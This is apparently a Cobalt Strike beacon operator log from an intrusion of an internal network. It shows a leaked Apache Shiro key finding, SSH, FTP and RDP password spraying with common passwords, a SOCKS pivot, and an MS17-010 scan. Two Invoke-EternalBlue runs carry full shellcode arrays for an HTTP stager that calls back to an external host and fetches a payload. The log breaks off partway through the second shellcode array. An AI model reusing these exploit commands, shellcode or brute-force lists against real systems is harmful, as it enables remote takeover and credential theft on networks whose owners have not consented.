+[-]ParseResponse error:  context deadline exceeded (Client.Timeout or context cancellation while reading body)
+
+
+12/08 12:07:47 UTC [output]
+received output:
+[-]ParseResponse error:  context deadline exceeded (Client.Timeout or context cancellation while reading body)
+[-]ParseResponse error:  context deadline exceeded (Client.Timeout or context cancellation while reading body)
+
+
+12/08 12:07:49 UTC [output]
+received output:
+[-]ParseResponse error:  context deadline exceeded (Client.Timeout or context cancellation while reading body)
+
+
+12/08 12:07:52 UTC [output]
+received output:
+[-]ParseResponse error:  context deadline exceeded (Client.Timeout or context cancellation while reading body)
+[-]ParseResponse error:  context deadline exceeded (Client.Timeout or context cancellation while reading body)
+[-]ParseResponse error:  context deadline exceeded (Client.Timeout or context cancellation while reading body)
+
+
+12/08 12:07:54 UTC [output]
+received output:
+2023/12/08 20:07:51 Unsolicited response received on idle HTTP channel starting with "0\r\n\r\n"; err=<nil>
+
+
+12/08 12:07:58 UTC [output]
+received output:
+[+] http://172.17.104.14:9080/ poc-yaml-shiro-key [{key 4AvVhmFLUs0KTA3Kprsdag==} {mode cbc}]
+
+
+12/08 12:08:01 UTC [output]
+received output:
+[-]ParseResponse error:  context deadline exceeded (Client.Timeout or context cancellation while reading body)
+
+
+12/08 12:08:04 UTC [output]
+received output:
+[-]ParseResponse error:  read tcp 172.17.104.14:60709->172.17.102.2:443: wsarecv: An established connection was aborted by the software in your host machine.
+[-]ParseResponse error:  read tcp 172.17.104.14:60777->172.17.102.8:443: wsarecv: An established connection was aborted by the software in your host machine.
+
+
+12/08 12:08:06 UTC [output]
+received output:
+[-]ParseResponse error:  read tcp 172.17.104.14:60822->172.17.102.8:443: wsarecv: An established connection was aborted by the software in your host machine.
+[-]ParseResponse error:  read tcp 172.17.104.14:61231->172.17.102.2:443: wsarecv: An established connection was aborted by the software in your host machine.
+
+
+12/08 12:08:07 UTC [output]
+received output:
+[-]ParseResponse error:  read tcp 172.17.104.14:61984->172.17.102.3:443: wsarecv: An established connection was aborted by the software in your host machine.
+
+
+12/08 12:08:08 UTC [output]
+received output:
+[-]ParseResponse error:  read tcp 172.17.104.14:62245->172.17.102.4:443: wsarecv: An established connection was aborted by the software in your host machine.
+[-]ParseResponse error:  read tcp 172.17.104.14:62750->172.17.102.3:443: wsarecv: An established connection was aborted by the software in your host machine.
+
+
+12/08 12:08:15 UTC [output]
+received output:
+[-]ParseResponse error:  read tcp 172.17.104.14:50636->172.17.102.2:443: wsarecv: An established connection was aborted by the software in your host machine.
+[-]ParseResponse error:  read tcp 172.17.104.14:50630->172.17.102.8:443: wsarecv: An established connection was aborted by the software in your host machine.
+[-]ParseResponse error:  read tcp 172.17.104.14:50882->172.17.102.2:443: wsarecv: An established connection was aborted by the software in your host machine.
+[-]ParseResponse error:  read tcp 172.17.104.14:51116->172.17.102.4:443: wsarecv: An established connection was aborted by the software in your host machine.
+[-]ParseResponse error:  read tcp 172.17.104.14:51278->172.17.102.8:443: wsarecv: An established connection was aborted by the software in your host machine.
+
+
+12/08 12:08:16 UTC [output]
+received output:
+[-]ParseResponse error:  read tcp 172.17.104.14:51883->172.17.102.3:443: wsarecv: An established connection was aborted by the software in your host machine.
+
+
+12/08 12:08:17 UTC [output]
+received output:
+[-]ParseResponse error:  read tcp 172.17.104.14:52588->172.17.102.3:443: wsarecv: An established connection was aborted by the software in your host machine.
+
+
+12/08 12:08:18 UTC [output]
+received output:
+2023/12/08 20:08:16 Unsolicited response received on idle HTTP channel starting with "Server Responsed. Requested: /console/j_security_check\n"; err=<nil>
+
+
+12/08 12:08:43 UTC [output]
+received output:
+2023/12/08 20:08:41 Unsolicited response received on idle HTTP channel starting with "Server Responsed. Requested: /console/j_security_check\n"; err=<nil>
+
+
+12/08 12:08:45 UTC [output]
+received output:
+2023/12/08 20:08:43 Unsolicited response received on idle HTTP channel starting with "Server Responsed. Requested: /console/j_security_check\n"; err=<nil>
+
+
+12/08 12:08:58 UTC [output]
+received output:
+宸插畬鎴� 364/514 [-] ssh 172.17.109.212:22 admin admin1 ssh: handshake failed: ssh: disconnect, reason 2: Disconnected: No supported authentication methods
+
+
+12/08 12:09:28 UTC [input] <dog> socks 57147
+12/08 12:09:29 UTC [output]
+started SOCKS4a server on: 57147
+
+12/08 12:09:29 UTC [checkin] host called home, sent: 16 bytes
+12/08 12:10:00 UTC [output]
+received output:
+宸插畬鎴� 505/514 [-] (151/210) rdp 172.17.110.253:3389 guest 111111 remote error: tls: access denied
+
+
+12/08 12:11:00 UTC [output]
+received output:
+宸插畬鎴� 506/514 [-] ssh 172.17.102.206:22 admin 123 ssh: handshake failed: ssh: unable to authenticate, attempted methods [none password], no supported methods remain
+
+
+12/08 12:12:02 UTC [output]
+received output:
+宸插畬鎴� 506/514 [-] ssh 172.17.102.2:22 admin admin_123 ssh: handshake failed: ssh: unable to authenticate, attempted methods [none password], no supported methods remain
+
+
+12/08 12:13:02 UTC [output]
+received output:
+宸插畬鎴� 507/514 [-] ssh 172.17.102.205:22 admin abc123 ssh: handshake failed: ssh: unable to authenticate, attempted methods [none password], no supported methods remain
+
+
+12/08 12:14:04 UTC [output]
+received output:
+宸插畬鎴� 508/514 [-] ssh 172.17.102.2:22 admin Charge123 ssh: handshake failed: ssh: unable to authenticate, attempted methods [none password], no supported methods remain
+
+
+12/08 12:15:15 UTC [output]
+received output:
+宸插畬鎴� 513/514 [-] ftp://172.17.110.253:21 ftp a11111 530 Login or password incorrect!
+
+
+12/08 12:16:27 UTC [output]
+received output:
+宸插畬鎴� 513/514 [-] ftp://172.17.110.253:21 ftp a123123 530 Login or password incorrect!
+
+
+12/08 12:17:39 UTC [output]
+received output:
+宸插畬鎴� 513/514 [-] ftp://172.17.110.253:21 ftp 1qaz!QAZ 530 Login or password incorrect!
+
+
+12/08 12:18:51 UTC [output]
+received output:
+宸插畬鎴� 513/514 [-] ftp://172.17.110.253:21 ftp 1q2w3e 530 Login or password incorrect!
+
+
+12/08 12:20:03 UTC [output]
+received output:
+宸插畬鎴� 513/514 [-] ftp://172.17.110.253:21 admin root 530 Login or password incorrect!
+
+
+12/08 12:21:15 UTC [output]
+received output:
+宸插畬鎴� 513/514 [-] ftp://172.17.110.253:21 admin 654321 530 Login or password incorrect!
+
+
+12/08 12:22:27 UTC [output]
+received output:
+宸插畬鎴� 513/514 [-] ftp://172.17.110.253:21 admin admin123!@# 530 Login or password incorrect!
+
+
+12/08 12:23:39 UTC [output]
+received output:
+宸插畬鎴� 513/514 [-] ftp://172.17.110.253:21 admin admin_123 530 Login or password incorrect!
+
+
+12/08 12:24:51 UTC [output]
+received output:
+宸插畬鎴� 513/514 [-] ftp://172.17.110.253:21 admin P@ssw0rd 530 Login or password incorrect!
+
+
+12/08 12:26:03 UTC [output]
+received output:
+宸插畬鎴� 513/514 [-] ftp://172.17.110.253:21 admin 123qwe 530 Login or password incorrect!
+
+
+12/08 12:26:26 UTC [output]
+-------------------------------------------------------------MS17010探测------------------------------------------------------------
+
+12/08 12:26:52 UTC [task] <T1093> Tasked beacon to run .NET program: Ladon.exe 172.17.1.1/16 MS17010
+12/08 12:26:52 UTC [checkin] host called home, sent: 989269 bytes
+12/08 12:26:56 UTC [output]
+received output:
+Ladon 6.6
+Start: 2023-12-8 20:26:54
+Runtime: .net 4.0  OS Arch: x64
+OS Name: Microsoft Windows Server 2008 R2 Standard 
+172.17.1.1/16
+load MS17010
+172.17.1.1/16 is Valid CIDR
+
+
+12/08 12:26:56 UTC [output]
+received output:
+IPCound: 65536
+Scan Start: 2023-12-8 20:26:55
+
+
+12/08 12:27:15 UTC [output]
+received output:
+宸插畬鎴� 513/514 [-] ftp://172.17.110.253:21 admin 123456~a 530 Login or password incorrect!
+
+
+12/08 12:27:37 UTC [output]
+-------------------------------------------------------------MS17010利用------------------------------------------------------------
+
+12/08 12:28:02 UTC [task] <T1086, T1064> Tasked beacon to import: E:\tools\内网渗透\CS插件\谢公子插件\powershell\Invoke-EternalBlue.ps1
+12/08 12:28:02 UTC [task] <T1086, T1093> Tasked beacon to run: Invoke-EternalBlue -Target 172.17.104.52 -Shellcode @(0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc8, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18, 0x48, 0x8b, 0x52, 0x20, 0x48, 0x8b, 0x72, 0x50, 0x48, 0x0f, 0xb7, 0x4a, 0x4a, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0xe2, 0xed, 0x52, 0x41, 0x51, 0x48, 0x8b, 0x52, 0x20, 0x8b, 0x42, 0x3c, 0x48, 0x01, 0xd0, 0x66, 0x81, 0x78, 0x18, 0x0b, 0x02, 0x75, 0x72, 0x8b, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x67, 0x48, 0x01, 0xd0, 0x50, 0x8b, 0x48, 0x18, 0x44, 0x8b, 0x40, 0x20, 0x49, 0x01, 0xd0, 0xe3, 0x56, 0x48, 0xff, 0xc9, 0x41, 0x8b, 0x34, 0x88, 0x48, 0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0x38, 0xe0, 0x75, 0xf1, 0x4c, 0x03, 0x4c, 0x24, 0x08, 0x45, 0x39, 0xd1, 0x75, 0xd8, 0x58, 0x44, 0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0, 0x66, 0x41, 0x8b, 0x0c, 0x48, 0x44, 0x8b, 0x40, 0x1c, 0x49, 0x01, 0xd0, 0x41, 0x8b, 0x04, 0x88, 0x48, 0x01, 0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a, 0x41, 0x58, 0x41, 0x59, 0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41, 0x59, 0x5a, 0x48, 0x8b, 0x12, 0xe9, 0x4f, 0xff, 0xff, 0xff, 0x5d, 0x6a, 0x00, 0x49, 0xbe, 0x77, 0x69, 0x6e, 0x69, 0x6e, 0x65, 0x74, 0x00, 0x41, 0x56, 0x49, 0x89, 0xe6, 0x4c, 0x89, 0xf1, 0x41, 0xba, 0x4c, 0x77, 0x26, 0x07, 0xff, 0xd5, 0x48, 0x31, 0xc9, 0x48, 0x31, 0xd2, 0x4d, 0x31, 0xc0, 0x4d, 0x31, 0xc9, 0x41, 0x50, 0x41, 0x50, 0x41, 0xba, 0x3a, 0x56, 0x79, 0xa7, 0xff, 0xd5, 0xeb, 0x73, 0x5a, 0x48, 0x89, 0xc1, 0x41, 0xb8, 0xb8, 0x22, 0x00, 0x00, 0x4d, 0x31, 0xc9, 0x41, 0x51, 0x41, 0x51, 0x6a, 0x03, 0x41, 0x51, 0x41, 0xba, 0x57, 0x89, 0x9f, 0xc6, 0xff, 0xd5, 0xeb, 0x59, 0x5b, 0x48, 0x89, 0xc1, 0x48, 0x31, 0xd2, 0x49, 0x89, 0xd8, 0x4d, 0x31, 0xc9, 0x52, 0x68, 0x00, 0x02, 0x40, 0x84, 0x52, 0x52, 0x41, 0xba, 0xeb, 0x55, 0x2e, 0x3b, 0xff, 0xd5, 0x48, 0x89, 0xc6, 0x48, 0x83, 0xc3, 0x50, 0x6a, 0x0a, 0x5f, 0x48, 0x89, 0xf1, 0x48, 0x89, 0xda, 0x49, 0xc7, 0xc0, 0xff, 0xff, 0xff, 0xff, 0x4d, 0x31, 0xc9, 0x52, 0x52, 0x41, 0xba, 0x2d, 0x06, 0x18, 0x7b, 0xff, 0xd5, 0x85, 0xc0, 0x0f, 0x85, 0x9d, 0x01, 0x00, 0x00, 0x48, 0xff, 0xcf, 0x0f, 0x84, 0x8c, 0x01, 0x00, 0x00, 0xeb, 0xd3, 0xe9, 0xe4, 0x01, 0x00, 0x00, 0xe8, 0xa2, 0xff, 0xff, 0xff, 0x44, 0x6f, 0x67, 0x43, 0x73, 0x44, 0x6f, 0x67, 0x43, 0x73, 0x44, 0x6f, 0x67, 0x43, 0x73, 0x2e, 0x6a, 0x73, 0x00, 0xd1, 0xb3, 0x08, 0xa4, 0x78, 0xa3, 0x15, 0x70, 0xf8, 0xed, 0x20, 0x34, 0x2d, 0x37, 0x39, 0x28, 0xa0, 0xea, 0x99, 0xe7, 0xc9, 0x83, 0x63, 0xd0, 0x31, 0xa6, 0x8a, 0x64, 0xeb, 0x51, 0xc5, 0x4d, 0x34, 0xb8, 0xa6, 0xa9, 0x2e, 0xeb, 0x0b, 0xc2, 0xbb, 0x0f, 0x57, 0x2a, 0x06, 0xf9, 0x07, 0x22, 0xe5, 0x7a, 0x08, 0x37, 0x98, 0xc8, 0xe5, 0x05, 0x01, 0x97, 0xa4, 0x4d, 0x00, 0x55, 0x73, 0x65, 0x72, 0x2d, 0x41, 0x67, 0x65, 0x6e, 0x74, 0x3a, 0x20, 0x4d, 0x6f, 0x7a, 0x69, 0x6c, 0x6c, 0x61, 0x2f, 0x35, 0x2e, 0x30, 0x20, 0x28, 0x63, 0x6f, 0x6d, 0x70, 0x61, 0x74, 0x69, 0x62, 0x6c, 0x65, 0x3b, 0x20, 0x4d, 0x53, 0x49, 0x45, 0x20, 0x39, 0x2e, 0x30, 0x3b, 0x20, 0x57, 0x69, 0x6e, 0x64, 0x6f, 0x77, 0x73, 0x20, 0x4e, 0x54, 0x20, 0x36, 0x2e, 0x31, 0x3b, 0x20, 0x57, 0x4f, 0x57, 0x36, 0x34, 0x3b, 0x20, 0x54, 0x72, 0x69, 0x64, 0x65, 0x6e, 0x74, 0x2f, 0x35, 0x2e, 0x30, 0x3b, 0x20, 0x53, 0x4c, 0x43, 0x43, 0x32, 0x3b, 0x20, 0x2e, 0x4e, 0x45, 0x54, 0x20, 0x43, 0x4c, 0x52, 0x20, 0x32, 0x2e, 0x30, 0x2e, 0x35, 0x30, 0x37, 0x32, 0x37, 0x3b, 0x20, 0x2e, 0x4e, 0x45, 0x54, 0x20, 0x43, 0x4c, 0x52, 0x20, 0x33, 0x2e, 0x35, 0x2e, 0x33, 0x30, 0x37, 0x32, 0x39, 0x3b, 0x20, 0x2e, 0x4e, 0x45, 0x54, 0x20, 0x43, 0x4c, 0x52, 0x20, 0x33, 0x2e, 0x30, 0x2e, 0x33, 0x30, 0x37, 0x32, 0x39, 0x3b, 0x20, 0x4d, 0x65, 0x64, 0x69, 0x61, 0x20, 0x43, 0x65, 0x6e, 0x74, 0x65, 0x72, 0x20, 0x50, 0x43, 0x20, 0x36, 0x2e, 0x30, 0x3b, 0x20, 0x49, 0x6e, 0x66, 0x6f, 0x50, 0x61, 0x74, 0x68, 0x2e, 0x33, 0x3b, 0x20, 0x2e, 0x4e, 0x45, 0x54, 0x34, 0x2e, 0x30, 0x43, 0x3b, 0x20, 0x2e, 0x4e, 0x45, 0x54, 0x34, 0x2e, 0x30, 0x45, 0x29, 0x0d, 0x0a, 0x00, 0xa7, 0xd0, 0x00, 0x1e, 0x9f, 0x5e, 0xb2, 0x01, 0x4c, 0xd4, 0xae, 0x67, 0xc6, 0x76, 0x0a, 0x3e, 0x1f, 0xc4, 0x5d, 0xa8, 0x92, 0xbf, 0x4c, 0xc1, 0x7c, 0x76, 0xd2, 0xb6, 0xa3, 0x70, 0x23, 0x27, 0x96, 0xeb, 0xa1, 0x7c, 0xa6, 0x0f, 0xe9, 0x01, 0x7c, 0xa1, 0x96, 0xc7, 0x0f, 0x95, 0xda, 0x03, 0x21, 0x5e, 0xf8, 0xa6, 0x9e, 0x3f, 0xca, 0x46, 0x1c, 0x1d, 0xd1, 0xd8, 0x38, 0x0e, 0x60, 0xf1, 0xd1, 0x87, 0x52, 0x8f, 0x75, 0x6b, 0x3d, 0x93, 0x62, 0x72, 0x9b, 0xbd, 0xba, 0x8f, 0x2c, 0xcf, 0x71, 0x6c, 0x48, 0x29, 0x24, 0xe9, 0xb4, 0xbd, 0x71, 0x1e, 0xe6, 0xf4, 0x42, 0xa6, 0x46, 0xb6, 0xe4, 0xe2, 0x00, 0x41, 0xbe, 0xf0, 0xb5, 0xa2, 0x56, 0xff, 0xd5, 0x48, 0x31, 0xc9, 0xba, 0x00, 0x00, 0x40, 0x00, 0x41, 0xb8, 0x00, 0x10, 0x00, 0x00, 0x41, 0xb9, 0x40, 0x00, 0x00, 0x00, 0x41, 0xba, 0x58, 0xa4, 0x53, 0xe5, 0xff, 0xd5, 0x48, 0x93, 0x53, 0x53, 0x48, 0x89, 0xe7, 0x48, 0x89, 0xf1, 0x48, 0x89, 0xda, 0x41, 0xb8, 0x00, 0x20, 0x00, 0x00, 0x49, 0x89, 0xf9, 0x41, 0xba, 0x12, 0x96, 0x89, 0xe2, 0xff, 0xd5, 0x48, 0x83, 0xc4, 0x20, 0x85, 0xc0, 0x74, 0xb6, 0x66, 0x8b, 0x07, 0x48, 0x01, 0xc3, 0x85, 0xc0, 0x75, 0xd7, 0x58, 0x58, 0x58, 0x48, 0x05, 0x00, 0x00, 0x00, 0x00, 0x50, 0xc3, 0xe8, 0x9f, 0xfd, 0xff, 0xff, 0x34, 0x37, 0x2e, 0x31, 0x30, 0x39, 0x2e, 0x34, 0x39, 0x2e, 0x32, 0x32, 0x39, 0x00, 0x05, 0xf5, 0xe1, 0x00) -InitialGrooms 12 -MaxAttempts 5 (unmanaged)
+12/08 12:28:02 UTC [checkin] host called home, sent: 8182 bytes
+12/08 12:28:03 UTC [checkin] host called home, sent: 134767 bytes
+12/08 12:28:10 UTC [output]
+received output:
+VERBOSE: Connecting to target for activities
+VERBOSE: Connection established for exploitation.
+VERBOSE: all but last fragment of exploit packet
+
+
+12/08 12:28:11 UTC [output]
+received output:
+VERBOSE: socket error, exploit may fail 
+
+
+12/08 12:28:12 UTC [output]
+received output:
+VERBOSE: socket error, exploit may fail 
+VERBOSE: Running final exploit packet
+VERBOSE: socket error, exploit may fail 
+VERBOSE: SMB code: 00-00
+VERBOSE: Send the payload with the grooms
+
+
+12/08 12:28:15 UTC [output]
+received output:
+VERBOSE: Connecting to target for activities
+VERBOSE: Connection established for exploitation.
+VERBOSE: all but last fragment of exploit packet
+
+
+12/08 12:28:18 UTC [output]
+received output:
+VERBOSE: socket error, exploit may fail 
+VERBOSE: socket error, exploit may fail 
+VERBOSE: Running final exploit packet
+VERBOSE: socket error, exploit may fail 
+VERBOSE: SMB code: 00-00
+VERBOSE: Send the payload with the grooms
+
+
+12/08 12:28:22 UTC [output]
+received output:
+VERBOSE: Connecting to target for activities
+VERBOSE: Connection established for exploitation.
+VERBOSE: all but last fragment of exploit packet
+
+
+12/08 12:28:25 UTC [output]
+received output:
+VERBOSE: socket error, exploit may fail 
+VERBOSE: socket error, exploit may fail 
+VERBOSE: Running final exploit packet
+VERBOSE: socket error, exploit may fail 
+VERBOSE: SMB code: 00-00
+VERBOSE: Send the payload with the grooms
+
+
+12/08 12:28:27 UTC [output]
+received output:
+宸插畬鎴� 513/514 [-] ftp://172.17.110.253:21 admin 1qaz2wsx 530 Login or password incorrect!
+
+
+12/08 12:28:30 UTC [output]
+received output:
+VERBOSE: Connecting to target for activities
+VERBOSE: Connection established for exploitation.
+VERBOSE: all but last fragment of exploit packet
+
+
+12/08 12:28:33 UTC [output]
+received output:
+VERBOSE: socket error, exploit may fail 
+VERBOSE: socket error, exploit may fail 
+VERBOSE: Running final exploit packet
+VERBOSE: socket error, exploit may fail 
+VERBOSE: SMB code: 00-00
+VERBOSE: Send the payload with the grooms
+
+
+12/08 12:28:39 UTC [output]
+received output:
+VERBOSE: Connecting to target for activities
+VERBOSE: Connection established for exploitation.
+VERBOSE: all but last fragment of exploit packet
+
+
+12/08 12:28:42 UTC [output]
+received output:
+VERBOSE: socket error, exploit may fail 
+VERBOSE: socket error, exploit may fail 
+VERBOSE: Running final exploit packet
+VERBOSE: socket error, exploit may fail 
+VERBOSE: SMB code: 00-00
+VERBOSE: Send the payload with the grooms
+
+
+12/08 12:29:39 UTC [output]
+received output:
+宸插畬鎴� 513/514 [-] ftp://172.17.110.253:21 admin Aa1234 530 Login or password incorrect!
+
+
+12/08 12:30:51 UTC [output]
+received output:
+宸插畬鎴� 513/514 [-] ftp://172.17.110.253:21 admin Aa123456 530 Login or password incorrect!
+
+
+12/08 12:32:03 UTC [output]
+received output:
+宸插畬鎴� 513/514 [-] ftp://172.17.110.253:21 admin qwe123!@# 530 Login or password incorrect!
+
+
+12/08 12:32:14 UTC [output]
+-------------------------------------------------------------MS17010利用------------------------------------------------------------
+
+12/08 12:32:27 UTC [task] <T1086, T1064> Tasked beacon to import: E:\tools\内网渗透\CS插件\谢公子插件\powershell\Invoke-EternalBlue.ps1
+12/08 12:32:27 UTC [task] <T1086, T1093> Tasked beacon to run: Invoke-EternalBlue -Target 172.17.110.208 -Shellcode @(0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc8, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18, 0x48, 0x8b, 0x52, 0x20, 0x48, 0x8b, 0x72, 0x50, 0x48, 0x0f, 0xb7, 0x4a, 0x4a, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0xe2, 0xed, 0x52, 0x41, 0x51, 0x48, 0x8b, 0x52, 0x20, 0x8b, 0x42, 0x3c, 0x48, 0x01, 0xd0, 0x66, 0x81, 0x78, 0x18, 0x0b, 0x02, 0x75, 0x72, 0x8b, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x67, 0x48, 0x01, 0xd0, 0x50, 0x8b, 0x48, 0x18, 0x44, 0x8b, 0x40, 0x20, 0x49, 0x01, 0xd0, 0xe3, 0x56, 0x48, 0xff, 0xc9, 0x41, 0x8b, 0x34, 0x88, 0x48, 0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0x38, 0xe0, 0x75, 0xf1, 0x4c, 0x03, 0x4c, 0x24, 0x08, 0x45, 0x39, 0xd1, 0x75, 0xd8, 0x58, 0x44, 0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0, 0x66, 0x41, 0x8b, 0x0c, 0x48, 0x44, 0x8b, 0x40, 0x1c, 0x49, 0x01, 0xd0, 0x41, 0x8b, 0x04, 0x88, 0x48, 0x01, 0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a, 0x41, 0x58, 0x41, 0x59, 0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41, 0x59, 0x5a, 0x48, 0x8b, 0x12, 0xe9, 0x4f, 0xff, 0xff, 0xff, 0x5d, 0x6a, 0x00, 0x49, 0xbe, 0x77, 0x69, 0x6e, 0x69, 0x6e, 0x65, 0x74, 0x00, 0x41, 0x56, 0x49, 0x89, 0xe6, 0x4c, 0x89, 0xf1, 0x41, 0xba, 0x4c, 0x77, 0x26, 0x07, 0xff, 0xd5, 0x48, 0x31, 0xc9, 0x48, 0x31, 0xd2, 0x4d, 0x31, 0xc0, 0x4d, 0x31, 0xc9, 0x41, 0x50, 0x41, 0x50, 0x41, 0xba, 0x3a, 0x56, 0x79, 0xa7, 0xff, 0xd5, 0xeb, 0x73, 0x5a, 0x48, 0x89, 0xc1, 0x41, 0xb8, 0xb8, 0x22, 0x00, 0x00, 0x4d, 0x31, 0xc9, 0x41, 0x51, 0x41, 0x51, 0x6a, 0x03, 0x41, 0x51, 0x41, 0xba, 0x57, 0x89, 0x9f, 0xc6, 0xff, 0xd5, 0xeb, 0x59, 0x5b, 0x48, 0x89, 0xc1, 0x48, 0x31, 0xd2, 0x49, 0x89, 0xd8, 0x4d, 0x31, 0xc9, 0x52, 0x68, 0x00, 0x02, 0x40, 0x84, 0x52, 0x52, 0x41, 0xba, 0xeb, 0x55, 0x2e, 0x3b, 0xff, 0xd5, 0x48, 0x89, 0xc6, 0x48, 0x83, 0xc3, 0x50, 0x6a, 0x0a, 0x5f, 0x48, 0x89, 0xf1, 0x48, 0x89, 0xda, 0x49, 0xc7, 0xc0, 0xff, 0xff, 0xff, 0xff, 0x4d, 0x31, 0xc9, 0x52, 0x52, 0x41, 0xba, 0x2d, 0x06, 0x18, 0x7b, 0xff, 0xd5, 0x85, 0xc0, 0x0f, 0x85, 0x9d, 0x01, 0x00, 0x00, 0x48, 0xff, 0xcf, 0x0f, 0x84, 0x8c, 0x01, 0x00, 0x00, 0xeb, 0xd3, 0xe9, 0xe4, 0x01, 0x00, 0x00, 0xe8, 0xa2, 0xff, 0xff, 0xff, 0x44, 0x6f, 0x67, 0x43, 0x73, 0x44, 0x6f, 0x67, 0x43, 0x73, 0x44, 0x6f, 0x67, 0x43, 0x73, 0x2e, 0x6a, 0x73, 0x00, 0xd7, 0x2a, 0xf2, 0xab, 0xa0, 0x41, 0x22, 0x18, 0xd0, 0x14, 0x29, 0x8c, 0xee, 0x8f, 0x4f, 0x84, 0x8a, 0xde, 0x7f, 0xa0, 0x25, 0xd9, 0xe3, 0x76, 0x8c, 0x63, 0x6f, 0x3b, 0x06, 0x40, 0x68, 0x94, 0xe5, 0xd3, 0x6f, 0x1c, 0x0c, 0x4e, 0xad, 0xee, 0xb9, 0x00, 0x10, 0x47, 0xdb, 0x5d, 0x63, 0x00, 0xa3, 0xac, 0x27, 0x38, 0x5d, 0x05, 0x0f, 0xb0, 0x8a, 0xce, 0x99, 0x4e, 0x00, 0x55, 0x73, 0x65, 0x72, 0x2d, 0x41, 0x67, 0x65, 0x6e, 0x74, 0x3a, 0x20, 0x4d, 0x6f, 0x7a, 0x69, 0x6c, 0x6c, 0x61, 0x2f, 0x35, 0x2e, 0x30, 0x20, 0x28, 0x63, 0x6f, 0x6d, 0x70, 0x61, 0x74, 0x69, 0x62, 0x6c, 0x65, 0x3b, 0x20, 0x4d, 0x53, 0x49, 0x45, 0x20, 0x39, 0x2e, 0x30, 0x3b, 0x20, 0x57, 0x69, 0x6e, 0x64, 0x6f, 0x77, 0x73, 0x20, 0x4e, 0x54, 0x20, 0x36, 0x2e, 0x31, 0x3b, 0x20, 0x57, 0x4f, 0x57, 0x36, 0x34, 0x3b, 0x20, 0x54, 0x72, 0x69, 0x64, 0x65, 0x6e, 0x74, 0x2f, 0x35, 0x2e, 0x30, 0x29, 0x0d, 0x0a, 0x00, 0x7a, 0x03, 0x7f, 0x4e, 0xb6, 0x05, 0x0d, 0xcb, 0x69, 0xf3, 0xbf, 0x99, 0x90, 0xa3, 0xb1, 0x79, 0x45, 0xaf, 0x57, 0x30, 0x28, 0x7a, 0x0e, 0x76, 0xf3, 0x27, 0xde, 0x15, 0x55, 0x0f, 0xa8, 0x2c, 0x04, 0xa4, 0x88, 0x86, 0xf0, 0x75, 0xd7, 0x4d, 0x3e, 0xad, 0x31, 0xd3, 0x29, 0x8d, 0x9e, 0xd2, 0x2e, 0x9e, 0xc1, 0x61, 0x7c, 0xe6, 0x1f, 0x01, 0xcd, 0x39, 0x26, 0x5c, 0x6b, 0x54, 0x13, 0xde, 0x72, 0x1d, 0xad, 0x89, 0xc4, 0xab, 0xc1, 0xd1, 0x3f, 0x94, 0xc8, 0xf3, 0xef, 0xef, 0xf6, 0x0a, 0x31, 0x81, 0x3e, 0x11, 0xdb, 0xc2, 0x0b, 0x4f, 0xa8, 0x7e, 0x8b, 0xd3, 0xdc, 0x51, 0xc0, 0x0d, 0x0b, 0x17, 0xe8, 0xb6, 0x52, 0x47, 0x3c, 0x31, 0x17, 0x95, 0x02, 0xa7, 0x85, 0x3d, 0x87, 0x57, 0x15, 0x47, 0xa8, 0xb1, 0xc0, 0x33, 0xc4, 0x30, 0xcb, 0x65, 0x12, 0x1b, 0xb5, 0x30, 0xbb, 0xee, 0xf2, 0xce, 0x51, 0x66, 0x91, 0x49, 0xc3, 0x6b, 0xfe, 0x41, 0x96, 0xf6, 0x73, 0x26, 0x17, 0xde, 0x95, 0xe9, 0x64, 0x5a, 0x8e, 0x63, 0x74, 0xfa, 0x83, 0xad, 0x53, 0x3a, 0x68, 0x1c, 0x05, 0x23, 0xac, 0x18, 0xa9, 0x3b, 0x75, 0x60, 0x68, 0x74, 0x61, 0x4c, 0xef, 0x0b, 0xbd, 0xfa, 0x5e, 0x1f, 0xcc, 0x37, 0x73, 0xf1, 0x72, 0x08, 0xeb, 0x54, 0xf8, 0x54, 0x05, 0xa1, 0x54, 0x86, 0x07, 0xf3, 0x02, 0xbf, 0x1b, 0xf4, 0x82, 0x80, 0x3b, 0xb9, 0x7e, 0xb9, 0x55, 0xbf, 0x70, 0xab, 0x7b, 0xdd, 0x31, 0x29, 0x5b, 0xfd, 0x4a, 0x59, 0x23, 0xbe, 0xb2, 0xd7, 0x00, 0x41, 0xbe, 0xf0, 0xb5, 0xa2, 0x56, 0xff, 0xd5, 0x48, 0x31, 0xc9, 0xba, 0x00, 0x00, 0x40, 0x00, 0x41, 0xb8, 0x00, 0x10, 0x00, 0x00, 0x41, 0xb9, 0x40, 0x00, 0x00, 0x00, 0x41, 0xba, 0x58, 0xa4, 0x53, 0xe5, 